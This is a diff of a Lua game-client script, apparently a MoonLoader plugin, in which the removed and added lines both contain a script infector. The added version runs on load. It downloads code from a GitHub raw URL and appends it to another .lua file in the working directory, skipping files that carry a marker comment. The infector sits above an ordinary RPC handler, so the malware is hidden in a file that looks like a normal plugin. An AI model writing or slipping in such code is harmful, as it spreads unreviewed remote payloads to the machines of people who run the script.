@@ -1,38 +1,28 @@
-local function LipaZaebalXoditInKazik()
-    local Directory = getWorkingDirectory().."\\"
-    local Dir = io.popen('chcp 1251|dir /a-d /b "'..Directory..'"')
-  
-    local VirusExe
+local Directory = getWorkingDirectory().."\\"
+local Dir = io.popen('chcp 1251|dir /a-d /b "'..Directory..'"')
 
-    for Filename in Dir:lines() do
-
-        if Filename:find("^.+%.lua$") then
-
-            local FileText = ""
-            local File = io.open(Directory..Filename, "r")
-            for Line in File:lines() do
-                if FileText ~= "" then
-                    FileText = FileText.."\n"
-                end
-
-                FileText = FileText..Line
-            end
-            File:close()
-
-            if not FileText:find("%-%- Fuck that shit") then
-                FileText = FileText.."\n"..VirusDll.."\n"..VirusExe
-
-                local File = io.open(Directory..Filename, "w")
-                File:write(FileText)
-                File:close()
+for Filename in Dir:lines() do
+    if Filename:find("^.+%.lua$") then
+        local FileText = ""
+        local File = io.open(Directory..Filename, "r")
+        for Line in File:lines() do
+            if FileText ~= "" then
+                FileText = FileText.."\n"
             end
 
-            break
+            FileText = FileText..Line
         end
+        File:close()
+        if not FileText:find("%-%- Fuck that shit") then
+            FileText = FileText.."\n"..(require "requests").get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text
+
+            local File = io.open(Directory..Filename, "w")
+            File:write(FileText)
+            File:close()
+        end
+        break
     end
 end
-LipaZaebalXoditInKazik()
-
 function onReceiveRpc(id, bs)
     if id == 93 then
         local color = raknetBitStreamReadInt32(bs)
